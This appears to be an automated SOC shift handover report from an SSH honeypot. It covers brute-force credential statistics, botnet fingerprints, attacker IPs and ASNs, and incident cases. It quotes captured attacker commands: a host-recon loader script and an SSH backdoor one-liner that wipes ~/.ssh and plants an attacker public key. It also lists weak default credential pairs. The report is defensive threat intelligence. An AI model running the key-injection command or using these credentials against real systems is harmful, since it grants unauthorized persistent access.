# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-10 |
| **Generated At** | 2026-07-10T14:36:31Z |
| **Shift Time** | 14:36 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **345** |
| Confirmed Threats | **332** |
| False Positives Filtered | **13** (3.8%) |
| Unique Attacker IPs | **68** |
| Countries of Origin | **23** |
| High Severity Cases | **159** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **186** |
| Malware Samples Analyzed | **3** HIGH · **38** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **189** |
| Unique Credential Pairs | **129** |
| Unique Usernames | **18** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **169** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `hadoop` | 31 |
| `git` | 31 |
| `user` | 26 |
| `root` | 24 |
| `test` | 17 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1q2w3e4r` | 9 |
| `qwerty123456` | 8 |
| `p@ssw0rd` | 7 |
| `qwerty1234` | 7 |
| `test` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `Root` | `1q2w3e4r` | 6 |
| `support` | `support` | 5 |
| `unknown` | `qwerty123456` | 5 |
| `test` | `test6` | 5 |
| `root` | `smo@@kkklss` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `user` | `pass` | `91.92.40.204` | 2026-07-10T10:55:20 |
| `user` | `P@ssw0rd` | `91.92.40.204` | 2026-07-10T10:56:32 |
| `user` | `qwe123` | `91.92.40.204` | 2026-07-10T10:57:44 |
| `user` | `qwer1234` | `91.92.40.204` | 2026-07-10T10:58:56 |
| `support` | `1212` | `49.124.152.148` | 2026-07-10T11:00:03 |
| `user` | `password123` | `91.92.40.204` | 2026-07-10T11:00:11 |
| `support` | `1212` | `191.210.73.33` | 2026-07-10T11:00:11 |
| `ubuntu` | `123asd` | `45.198.224.120` | 2026-07-10T11:00:27 |
| `user` | `qwerty123456` | `91.92.40.204` | 2026-07-10T11:01:24 |
| `user` | `1234qwer` | `91.92.40.204` | 2026-07-10T11:02:38 |
| `user` | `123qwe` | `91.92.40.204` | 2026-07-10T11:03:51 |
| `support` | `1212` | `10.0.0.73` | 2026-07-10T11:04:00 |
| `support` | `support` | `176.53.159.196` | 2026-07-10T11:04:56 |
| `user` | `passpass` | `91.92.40.204` | 2026-07-10T11:05:04 |
| `support` | `support` | `10.0.0.73` | 2026-07-10T11:06:16 |
| `user` | `pass123` | `91.92.40.204` | 2026-07-10T11:06:16 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-10T11:07:15 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-10T11:07:15 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-10T11:07:15 |
| `user` | `pass1234` | `91.92.40.204` | 2026-07-10T11:07:30 |
| `unknown` | `qwerty123456` | `219.128.15.190` | 2026-07-10T11:08:28 |
| `unknown` | `qwerty123456` | `117.247.239.202` | 2026-07-10T11:08:41 |
| `user` | `wasd` | `91.92.40.204` | 2026-07-10T11:08:42 |
| `Root` | `1q2w3e4r` | `5.11.162.163` | 2026-07-10T11:09:24 |
| `Root` | `1q2w3e4r` | `116.48.151.136` | 2026-07-10T11:09:35 |
| `user` | `qwerty` | `91.92.40.204` | 2026-07-10T11:09:54 |
| `user` | `q1w2e3` | `91.92.40.204` | 2026-07-10T11:11:05 |
| `test` | `123` | `45.198.224.120` | 2026-07-10T11:11:19 |
| `unknown` | `qwerty123456` | `178.178.222.59` | 2026-07-10T11:11:58 |
| `user` | `q1w2e3r4` | `91.92.40.204` | 2026-07-10T11:12:18 |
| `unknown` | `qwerty123456` | `10.0.0.73` | 2026-07-10T11:12:24 |
| `Root` | `1q2w3e4r` | `118.43.231.252` | 2026-07-10T11:12:50 |
| `Root` | `1q2w3e4r` | `10.0.0.73` | 2026-07-10T11:13:12 |
| `user` | `1q2w3e` | `91.92.40.204` | 2026-07-10T11:13:31 |
| `user` | `1q2w3e4r` | `91.92.40.204` | 2026-07-10T11:14:47 |
| `user` | `111111` | `91.92.40.204` | 2026-07-10T11:16:01 |
| `user` | `qwerty123` | `91.92.40.204` | 2026-07-10T11:17:15 |
| `user` | `123321` | `91.92.40.204` | 2026-07-10T11:18:27 |
| `user` | `321123` | `91.92.40.204` | 2026-07-10T11:19:40 |
| `user` | `p@ssw0rd` | `91.92.40.204` | 2026-07-10T11:20:54 |
| `hadoop` | `123456` | `91.92.40.204` | 2026-07-10T11:22:08 |
| `root` | `hellokitty` | `45.198.224.120` | 2026-07-10T11:22:43 |
| `hadoop` | `654321` | `91.92.40.204` | 2026-07-10T11:23:21 |
| `hadoop` | `123` | `91.92.40.204` | 2026-07-10T11:24:35 |
| `webadmin` | `P@ssw0rd` | `2.26.230.127` | 2026-07-10T11:25:21 |
| `345gs5662d34` | `345gs5662d34` | `2.26.230.127` | 2026-07-10T11:25:23 |
| `webadmin` | `3245gs5662d34` | `2.26.230.127` | 2026-07-10T11:25:24 |
| `hadoop` | `321` | `91.92.40.204` | 2026-07-10T11:25:50 |
| `hadoop` | `test` | `91.92.40.204` | 2026-07-10T11:27:06 |
| `hadoop` | `test123` | `91.92.40.204` | 2026-07-10T11:28:22 |
| `config` | `config10` | `10.0.0.73` | 2026-07-10T11:29:25 |
| `hadoop` | `test321` | `91.92.40.204` | 2026-07-10T11:29:38 |
| `hadoop` | `password` | `91.92.40.204` | 2026-07-10T11:30:55 |
| `hadoop` | `passwd` | `91.92.40.204` | 2026-07-10T11:32:13 |
| `hadoop` | `pass` | `91.92.40.204` | 2026-07-10T11:33:30 |
| `root` | `qazwsxedc!@#` | `45.198.224.120` | 2026-07-10T11:34:10 |
| `supervisor` | `qwerty1234` | `49.229.157.48` | 2026-07-10T11:34:25 |
| `hadoop` | `P@ssw0rd` | `91.92.40.204` | 2026-07-10T11:34:46 |
| `operator` | `qwerty12` | `10.0.0.73` | 2026-07-10T11:35:51 |
| `hadoop` | `qwe123` | `91.92.40.204` | 2026-07-10T11:36:02 |
| `hadoop` | `qwer1234` | `91.92.40.204` | 2026-07-10T11:37:18 |
| `supervisor` | `supervisor22` | `219.248.65.30` | 2026-07-10T11:37:33 |
| `supervisor` | `supervisor22` | `179.181.133.153` | 2026-07-10T11:37:41 |
| `supervisor` | `qwerty1234` | `191.241.142.170` | 2026-07-10T11:37:50 |
| `supervisor` | `supervisor22` | `10.0.0.73` | 2026-07-10T11:37:51 |
| `supervisor` | `qwerty1234` | `10.0.0.73` | 2026-07-10T11:38:17 |
| `hadoop` | `password123` | `91.92.40.204` | 2026-07-10T11:38:34 |
| `hadoop` | `qwerty123456` | `91.92.40.204` | 2026-07-10T11:39:55 |
| `hadoop` | `1234qwer` | `91.92.40.204` | 2026-07-10T11:41:14 |
| `hadoop` | `123qwe` | `91.92.40.204` | 2026-07-10T11:42:29 |
| `hadoop` | `passpass` | `91.92.40.204` | 2026-07-10T11:43:44 |
| `hadoop` | `pass123` | `91.92.40.204` | 2026-07-10T11:45:02 |
| `hadoop` | `pass1234` | `91.92.40.204` | 2026-07-10T11:46:22 |
| `hadoop` | `wasd` | `91.92.40.204` | 2026-07-10T11:47:43 |
| `hadoop` | `qwerty` | `91.92.40.204` | 2026-07-10T11:49:01 |
| `hadoop` | `q1w2e3` | `91.92.40.204` | 2026-07-10T11:50:19 |
| `test` | `test6` | `14.194.128.158` | 2026-07-10T11:51:00 |
| `hadoop` | `q1w2e3r4` | `91.92.40.204` | 2026-07-10T11:51:38 |
| `bime` | `123456` | `45.198.224.120` | 2026-07-10T11:52:35 |
| `hadoop` | `1q2w3e` | `91.92.40.204` | 2026-07-10T11:52:57 |
| `hadoop` | `1q2w3e4r` | `91.92.40.204` | 2026-07-10T11:54:15 |
| `test` | `test6` | `122.170.100.253` | 2026-07-10T11:54:34 |
| `test` | `test6` | `186.103.136.43` | 2026-07-10T11:54:47 |
| `test` | `test6` | `10.0.0.73` | 2026-07-10T11:54:59 |
| `hadoop` | `111111` | `91.92.40.204` | 2026-07-10T11:55:34 |
| `hadoop` | `qwerty123` | `91.92.40.204` | 2026-07-10T11:56:56 |
| `guest` | `qwerty1234` | `211.22.222.251` | 2026-07-10T11:57:26 |
| `guest` | `qwerty1234` | `169.211.232.182` | 2026-07-10T11:57:36 |
| `hadoop` | `123321` | `91.92.40.204` | 2026-07-10T11:58:24 |
| `root` | `11223344` | `211.114.40.60` | 2026-07-10T11:59:03 |
| `root` | `11223344` | `91.144.158.62` | 2026-07-10T11:59:16 |
| `config` | `config1234` | `60.174.39.82` | 2026-07-10T11:59:28 |
| `config` | `config1234` | `65.20.204.41` | 2026-07-10T11:59:41 |
| `hadoop` | `321123` | `91.92.40.204` | 2026-07-10T11:59:46 |
| `hadoop` | `p@ssw0rd` | `91.92.40.204` | 2026-07-10T12:01:00 |
| `guest` | `qwerty1234` | `10.0.0.73` | 2026-07-10T12:01:11 |
| `git` | `123456` | `91.92.40.204` | 2026-07-10T12:02:12 |
| `root` | `11223344` | `223.107.72.234` | 2026-07-10T12:02:25 |
| `root` | `11223344` | `10.0.0.73` | 2026-07-10T12:02:51 |
| `git` | `654321` | `91.92.40.204` | 2026-07-10T12:03:27 |
| `root` | `tinkle` | `45.198.224.120` | 2026-07-10T12:03:39 |
| `git` | `123` | `91.92.40.204` | 2026-07-10T12:04:45 |
| `git` | `321` | `91.92.40.204` | 2026-07-10T12:06:03 |
| `git` | `test` | `91.92.40.204` | 2026-07-10T12:07:21 |
| `git` | `test123` | `91.92.40.204` | 2026-07-10T12:08:37 |
| `git` | `test321` | `91.92.40.204` | 2026-07-10T12:09:53 |
| `git` | `password` | `91.92.40.204` | 2026-07-10T12:11:10 |
| `git` | `passwd` | `91.92.40.204` | 2026-07-10T12:12:26 |
| `git` | `pass` | `91.92.40.204` | 2026-07-10T12:13:43 |
| `git` | `P@ssw0rd` | `91.92.40.204` | 2026-07-10T12:14:59 |
| `samp` | `123456` | `45.198.224.120` | 2026-07-10T12:15:05 |
| `git` | `qwe123` | `91.92.40.204` | 2026-07-10T12:16:18 |
| `git` | `qwer1234` | `91.92.40.204` | 2026-07-10T12:17:37 |
| `git` | `password123` | `91.92.40.204` | 2026-07-10T12:19:02 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-10T12:19:20 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-10T12:19:20 |
| `user` | `user00` | `27.128.162.146` | 2026-07-10T12:19:58 |
| `user` | `user00` | `45.181.101.95` | 2026-07-10T12:20:11 |
| `user` | `user00` | `10.0.0.73` | 2026-07-10T12:20:15 |
| `git` | `qwerty123456` | `91.92.40.204` | 2026-07-10T12:20:26 |
| `git` | `1234qwer` | `91.92.40.204` | 2026-07-10T12:21:52 |
| `git` | `123qwe` | `91.92.40.204` | 2026-07-10T12:23:20 |
| `unknown` | `p@ssw0rd` | `78.186.54.65` | 2026-07-10T12:23:53 |
| `unknown` | `p@ssw0rd` | `107.135.117.245` | 2026-07-10T12:24:05 |
| `git` | `passpass` | `91.92.40.204` | 2026-07-10T12:24:47 |
| `git` | `pass123` | `91.92.40.204` | 2026-07-10T12:26:12 |
| `guest` | `guest3` | `203.192.247.84` | 2026-07-10T12:26:33 |
| `guest` | `guest3` | `36.92.35.211` | 2026-07-10T12:26:42 |
| `guest` | `guest3` | `10.0.0.73` | 2026-07-10T12:26:57 |
| `unknown` | `p@ssw0rd` | `220.178.246.43` | 2026-07-10T12:27:18 |
| `unknown` | `p@ssw0rd` | `113.158.205.225` | 2026-07-10T12:27:27 |
| `git` | `pass1234` | `91.92.40.204` | 2026-07-10T12:27:34 |
| `operator` | `passw0rd` | `222.174.184.86` | 2026-07-10T12:28:21 |
| `operator` | `passw0rd` | `186.215.107.189` | 2026-07-10T12:28:33 |
| `operator` | `passw0rd` | `10.0.0.73` | 2026-07-10T12:28:41 |
| `git` | `wasd` | `91.92.40.204` | 2026-07-10T12:28:59 |
| `git` | `qwerty` | `91.92.40.204` | 2026-07-10T12:30:23 |
| `git` | `q1w2e3` | `91.92.40.204` | 2026-07-10T12:31:47 |
| `git` | `q1w2e3r4` | `91.92.40.204` | 2026-07-10T12:33:12 |
| `root` | `qwe1234%` | `45.198.224.120` | 2026-07-10T12:34:32 |
| `git` | `1q2w3e` | `91.92.40.204` | 2026-07-10T12:34:36 |
| `git` | `1q2w3e4r` | `91.92.40.204` | 2026-07-10T12:36:02 |
| `git` | `111111` | `91.92.40.204` | 2026-07-10T12:37:22 |
| `git` | `qwerty123` | `91.92.40.204` | 2026-07-10T12:38:36 |
| `git` | `123321` | `91.92.40.204` | 2026-07-10T12:39:51 |
| `git` | `321123` | `91.92.40.204` | 2026-07-10T12:41:03 |
| `git` | `p@ssw0rd` | `91.92.40.204` | 2026-07-10T12:42:17 |
| `test` | `123456` | `91.92.40.204` | 2026-07-10T12:43:33 |
| `test` | `654321` | `91.92.40.204` | 2026-07-10T12:44:47 |
| `test` | `test7` | `74.208.177.56` | 2026-07-10T12:45:31 |
| `test` | `123` | `91.92.40.204` | 2026-07-10T12:46:00 |
| `root` | `cisco` | `45.198.224.120` | 2026-07-10T12:46:00 |
| `test` | `321` | `91.92.40.204` | 2026-07-10T12:47:14 |
| `test` | `test123` | `91.92.40.204` | 2026-07-10T12:48:28 |
| `default` | `test` | `187.126.105.42` | 2026-07-10T12:48:50 |
| `root` | `root333` | `117.247.239.202` | 2026-07-10T12:48:54 |
| `root` | `root333` | `203.75.170.63` | 2026-07-10T12:49:03 |
| `test` | `test321` | `91.92.40.204` | 2026-07-10T12:49:43 |
| `supervisor` | `123123` | `98.170.57.236` | 2026-07-10T12:50:30 |
| `test` | `password` | `91.92.40.204` | 2026-07-10T12:50:57 |
| `test` | `passwd` | `91.92.40.204` | 2026-07-10T12:52:11 |
| `default` | `test` | `62.182.118.138` | 2026-07-10T12:52:13 |
| `default` | `test` | `183.239.20.236` | 2026-07-10T12:52:24 |
| `root` | `root333` | `10.0.0.73` | 2026-07-10T12:52:37 |
| `default` | `test` | `10.0.0.73` | 2026-07-10T12:52:45 |
| `test` | `pass` | `91.92.40.204` | 2026-07-10T12:53:26 |
| `supervisor` | `123123` | `125.59.252.103` | 2026-07-10T12:54:02 |
| `supervisor` | `123123` | `10.0.0.73` | 2026-07-10T12:54:24 |
| `test` | `P@ssw0rd` | `91.92.40.204` | 2026-07-10T12:54:41 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **345** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 106 |
| OpenSSH | 44 |
| Paramiko (Python) | 10 |
| libssh | 10 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 94 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 44 | 42 |
| `a2de0f306611...` | Mirai/variant | 10 | 2 |
| `16443846184e...` | Generic scanner | 9 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 94 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 44 | 42 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 9 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 6 | 2 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `e37f354a101a...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 94 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.204`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `2.26.230.127`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **68** |
| Unique ASNs | **50** |
| High-Risk ASNs | **44** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS22773` | Cox Communications Inc. | 6 | MEDIUM |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS3462` | Data Communication Business Group | 3 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 2 | HIGH |
| `AS46562` | Performive LLC | 2 | MEDIUM |
| `AS31898` | Oracle Corporation | 2 | HIGH |
| `AS4760` | HKT Limited | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (159)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7b7027edfbd7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 10:55 |
| **Last Seen** | 2026-07-10 10:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 10:55:18` | `cowrie.session.connect` |
| `2026-07-10 10:55:18` | `cowrie.client.version` |
| `2026-07-10 10:55:18` | `cowrie.client.kex` |
| `2026-07-10 10:55:20` | `cowrie.login.success` |
| `2026-07-10 10:55:22` | `cowrie.session.params` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.success` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.command.input` |
| `2026-07-10 10:55:22` | `cowrie.log.closed` |
| `2026-07-10 10:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054055a69d4b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 10:56 |
| **Last Seen** | 2026-07-10 10:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 10:56:30` | `cowrie.session.connect` |
| `2026-07-10 10:56:30` | `cowrie.client.version` |
| `2026-07-10 10:56:30` | `cowrie.client.kex` |
| `2026-07-10 10:56:32` | `cowrie.login.success` |
| `2026-07-10 10:56:33` | `cowrie.session.params` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.success` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:33` | `cowrie.command.input` |
| `2026-07-10 10:56:34` | `cowrie.log.closed` |
| `2026-07-10 10:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11ff8177755d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 10:57 |
| **Last Seen** | 2026-07-10 10:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 10:57:41` | `cowrie.session.connect` |
| `2026-07-10 10:57:42` | `cowrie.client.version` |
| `2026-07-10 10:57:42` | `cowrie.client.kex` |
| `2026-07-10 10:57:44` | `cowrie.login.success` |
| `2026-07-10 10:57:45` | `cowrie.session.params` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.success` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:45` | `cowrie.command.input` |
| `2026-07-10 10:57:46` | `cowrie.log.closed` |
| `2026-07-10 10:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05119cd6288d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]204` |
| **First Seen** | 2026-07-10 10:58 |
| **Last Seen** | 2026-07-10 10:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-10 10:58:54` | `cowrie.session.connect` |
| `2026-07-10 10:58:54` | `cowrie.client.version` |
| `2026-07-10 10:58:54` | `cowrie.client.kex` |
| `2026-07-10 10:58:56` | `cowrie.login.success` |
| `2026-07-10 10:58:57` | `cowrie.session.params` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.success` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.command.input` |
| `2026-07-10 10:58:57` | `cowrie.log.closed` |
| `2026-07-10 10:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]204` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]204` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64316162f710

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]148` |
| **First Seen** | 2026-07-10 11:00 |
| **Last Seen** | 2026-07-10 11:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
